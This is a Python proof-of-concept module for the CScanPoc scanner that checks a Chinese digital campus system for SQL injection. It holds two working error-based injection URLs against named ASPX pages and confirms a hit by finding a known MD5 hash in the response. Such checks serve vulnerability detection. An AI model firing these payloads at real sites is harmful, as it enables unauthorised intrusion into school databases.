# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Xinzuobiao_0011'  # 平台漏洞编号，留空
    name = '新座标数字校园系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-01'  # 漏洞公布时间
    desc = '''
        新座标数字校园系统是由无锡新座标教育技术有限公司打造的一款为数字校园的建设与应用提供了更加广阔背景的软件。
        新座标数字校园系统通用SQL注入漏洞。
        /DPMA/FWeb/SPEWeb/Web5/SPEPhotosDetail.aspx
        /DPMA/FWeb/WorkRoomWeb/Web/TeacherPhotosDetail.aspx
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/25296.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '新座标数字校园系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a90e3b49-1843-4f95-aee8-5530e63c7776'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [
                "/DPMA/FWeb/SPEWeb/Web5/SPEPhotosDetail.aspx?KindSetID=20010&ALBUMID=2011+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--",
                "/DPMA/FWeb/WorkRoomWeb/Web/TeacherPhotosDetail.aspx?TID=3050010135+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--&Album_ID=1075"
            ]
            for payload in payloads:
                verify_url = self.target + payload
                #code, head, res, errcode, _ = curl.curl2(url)
                r = requests.get(verify_url)
                if '81dc9bdb52d04dc20036dbd8313ed055' in r.text:
                    # security_hole(verity_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
